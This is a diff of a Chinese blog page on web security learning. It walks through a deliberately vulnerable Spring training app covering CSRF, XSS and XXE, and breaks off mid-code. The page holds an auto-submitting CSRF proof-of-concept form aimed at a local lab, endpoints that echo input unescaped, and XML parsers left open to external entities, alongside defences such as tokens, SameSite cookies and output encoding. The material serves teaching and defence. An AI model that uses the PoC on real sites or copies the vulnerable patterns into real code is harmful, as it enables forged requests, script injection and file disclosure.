@@ -74,7 +74,7 @@ zty153’s_blog = 网安 = web学习</title>
       <i class="ic i-pen"></i>
     </span>
     <span class="text">Symbols count in article</span>
-    <span>20k</span>
+    <span>31k</span>
     <span class="text">words</span>
   </span>
   <span class="item" title="Reading time">
@@ -82,7 +82,7 @@ zty153’s_blog = 网安 = web学习</title>
       <i class="ic i-clock"></i>
     </span>
     <span class="text">Reading time</span>
-    <span>18 mins.</span>
+    <span>28 mins.</span>
   </span>
 </div>
 
@@ -115,12 +115,12 @@ zty153’s_blog = 网安 = web学习</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?869795"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?899489"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?478908"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?618072"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?248520"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?954138"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?861026"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?84394"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?517210"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?882772"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?394502"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?414146"></li>
         </ul>
       </div>
     </header>
@@ -615,8 +615,277 @@ String template：要评估的模板字符串
 <h2 id="csrf"><a class="anchor" href="#csrf">#</a> CSRF</h2>
 <h3 id="1路由csrfpost"><a class="anchor" href="#1路由csrfpost">#</a> 1. 路由 /csrf/post</h3>
 <p>漏洞源码：</p>
-<pre><code>
+<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@Controller</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/csrf"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CSRF</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"form"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/post"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token annotation punctuation">@ResponseBody</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">post</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"CSRF passed."</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>对应前端代码：</p>
+<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name"><span class="token namespace">th:</span>src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>@&#123;https://code.jquery.com/jquery-3.4.1.min.js&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment">&lt;!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field --></span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token comment">&lt;!-- &lt;form name="f" th:action="@&#123;/csrf/post&#125;" method="post"> --></span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>f<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/csrf/post<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;_csrf.parameterName&#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;_csrf.token&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>该代码由于 /csrf/post 没有进行 token 的验证，可以直接访问，直接 poc 漏洞验证就好了：</p>
+<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSRF Exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Simulating CSRF Attack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrfForm<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1:8080/csrf/post<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>This is a CSRF attack message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment">// 自动提交表单，执行攻击</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'csrfForm'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507131613625.png" alt="image-20250713161313228" /></p>
+<h4 id="csrf防护"><a class="anchor" href="#csrf防护">#</a> csrf 防护：</h4>
+<h5 id="使用csrf-token"><a class="anchor" href="#使用csrf-token">#</a> <strong>使用 CSRF Token</strong>：</h5>
+<ul>
+<li>服务器生成一个唯一的 CSRF Token 并将其发送给用户（通常通过隐藏字段、URL 参数或 HTTP 头）。</li>
+<li>在提交表单或发起请求时，客户端将该 Token 一同发送回服务器，服务器验证 Token 的有效性以防止伪造请求。</li>
+</ul>
+<h5 id="samesite-cookie-属性"><a class="anchor" href="#samesite-cookie-属性">#</a> <strong>SameSite Cookie 属性</strong>：</h5>
+<ul>
+<li>设置 Cookie 的 <code>SameSite</code>  属性为 <code>Strict</code>  或 <code>Lax</code> ，限制第三方网站通过跨站点方式发送 Cookie。</li>
+<li><code>Strict</code> ：禁止任何跨站请求携带 Cookie。</li>
+<li><code>Lax</code> ：允许一些安全的跨站请求（例如 GET 请求），但阻止 POST 等敏感操作。</li>
+</ul>
+<h5 id="双重cookie验证"><a class="anchor" href="#双重cookie验证">#</a> <strong>双重 Cookie 验证</strong>：</h5>
+<ul>
+<li>服务器发送一个 Cookie 给用户，客户端在请求时会自动携带该 Cookie。</li>
+<li>客户端还需要在表单中携带相同的值（通过 JS 从 Cookie 中提取），服务器检查这两个值是否匹配。</li>
+</ul>
+<h5 id="检查referer头"><a class="anchor" href="#检查referer头">#</a> <strong>检查 Referer 头</strong>：</h5>
+<ul>
+<li>服务器通过验证请求头中的 <code>Referer</code>  字段是否来自合法的域名，来确定请求是否来自可信来源。</li>
+<li>这种方法并不完全可靠，因为有些环境下 <code>Referer</code>  头可能会被修改或省略。</li>
+</ul>
+<h5 id="captcha"><a class="anchor" href="#captcha">#</a> <strong>CAPTCHA</strong>：</h5>
+<ul>
+<li>使用 CAPTCHA 来确保请求是由真实用户而非自动化脚本发起，虽然这种方式不能完全防护 CSRF，但能增加攻击难度。</li>
+</ul>
+<h5 id="限制请求来源"><a class="anchor" href="#限制请求来源">#</a> <strong>限制请求来源</strong>：</h5>
+<ul>
+<li>对敏感操作（如资金转移、修改账户信息等）设置请求来源的严格验证，确保这些操作只能通过特定的合法来源进行。</li>
+</ul>
+<h2 id="xss"><a class="anchor" href="#xss">#</a> XSS</h2>
+<h3 id="1路由xssreflext"><a class="anchor" href="#1路由xssreflext">#</a> 1. 路由 /xss/reflext：</h3>
+<p>源码：</p>
+<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/reflect"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token annotation punctuation">@ResponseBody</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">reflect</span><span class="token punctuation">(</span><span class="token class-name">String</span> xss<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">return</span> xss<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>秒了，直接返回到页面直接 script 标签了<img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202507131617709.png" alt="image-20250713161737624" /></p>
+<h3 id="2路由xssstored"><a class="anchor" href="#2路由xssstored">#</a> 2. 路由 /xss/stored</h3>
+<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 先存储在 cookie 中</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/stored/store"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token annotation punctuation">@ResponseBody</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">store</span><span class="token punctuation">(</span><span class="token class-name">String</span> xss<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token class-name">Cookie</span> cookie <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cookie</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">,</span> xss<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        response<span class="token punctuation">.</span><span class="token function">addCookie</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">"Set param into cookie"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">// 将 cookie 中的路由展示出来</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/stored/show"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token annotation punctuation">@ResponseBody</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token annotation punctuation">@CookieValue</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> xss<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">return</span> xss<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="xss攻击防护"><a class="anchor" href="#xss攻击防护">#</a> XSS 攻击防护：</h3>
+<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/safe"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token annotation punctuation">@ResponseBody</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token class-name">String</span> xss<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token keyword">return</span> <span class="token function">encode</span><span class="token punctuation">(</span>xss<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token class-name">String</span> origin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        origin <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        origin <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;lt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        origin <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"&amp;gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        origin <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"&amp;quot;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        origin <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"&amp;#x27;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        origin <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>origin<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"&amp;#x2F;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">return</span> origin<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>将尖括号过滤就差不多了</p>
+<h2 id="xxe"><a class="anchor" href="#xxe">#</a> XXE</h2>
+<h3 id="1路由xxexmlreadervuln"><a class="anchor" href="#1路由xxexmlreadervuln">#</a> 1. 路由 /xxe/xmlReader/vuln</h3>
+<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/xmlReader/vuln"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">xmlReaderVuln</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token class-name">XMLReader</span> xmlReader <span class="token operator">=</span> <span class="token class-name">XMLReaderFactory</span><span class="token punctuation">.</span><span class="token function">createXMLReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            xmlReader<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// parse xml</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">"xmlReader xxe vuln code"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token keyword">return</span> <span class="token constant">EXCEPT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="2路由xxesaxbuildervuln"><a class="anchor" href="#2路由xxesaxbuildervuln">#</a> 2. 路由 /xxe/SAXBuilder/vuln</h3>
+<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/SAXBuilder/vuln"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">POST</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token class-name">SAXBuilderVuln</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token class-name">String</span> body <span class="token operator">=</span> <span class="token class-name">WebUtils</span><span class="token punctuation">.</span><span class="token function">getRequestBody</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token class-name">SAXBuilder</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SAXBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token comment">// org.jdom2.Document document</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// cause xxe</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token keyword">return</span> <span class="token string">"SAXBuilder xxe vuln code"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token 